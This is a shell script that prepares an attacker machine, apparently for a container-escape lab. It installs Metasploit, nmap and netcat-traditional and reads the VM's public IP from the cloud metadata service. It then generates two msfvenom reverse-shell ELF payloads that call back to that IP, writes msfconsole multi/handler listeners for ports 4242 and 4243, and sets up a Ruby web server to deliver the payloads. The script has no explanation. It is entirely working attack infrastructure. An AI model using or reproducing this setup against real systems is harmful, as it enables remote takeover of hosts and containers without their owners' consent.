#!/bin/sh

# install all necessary tools
sudo apt update && sudo apt remove -y netcat-openbsd && sudo apt install -y netcat-traditional
sudo apt install -y ca-certificates curl gnupg lsb-release
sudo apt install -y nmap ruby
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
sudo chmod 755 /tmp/msfinstall
sudo /tmp/msfinstall
sudo msfdb init

# create all metasploit stuff
PUBLIC_IP=$(curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text")
ROOT_DIR=/root/container-escape

sudo mkdir -p $ROOT_DIR

sudo [ ! -f $ROOT_DIR/met-container ] && sudo msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$PUBLIC_IP LPORT=4242 -f elf > $ROOT_DIR/met-container

sudo [ ! -f $ROOT_DIR/met-host ] && sudo msfvenom -p linux/x86/shell/reverse_tcp LHOST=$PUBLIC_IP LPORT=4243 -f elf > $ROOT_DIR/met-host

sudo [ ! -f $ROOT_DIR/msfconsole1 ] && sudo echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'" > $ROOT_DIR/msfconsole1

sudo [ ! -f $ROOT_DIR/msfconsole2 ] && sudo echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'" > $ROOT_DIR/msfconsole2

sudo [ ! -f $ROOT_DIR/start_ruby_webserver ] && echo "ruby -run -ehttpd . -p8001" > $ROOT_DIR/start_ruby_webserver

sudo chmod -R +x $ROOT_DIR
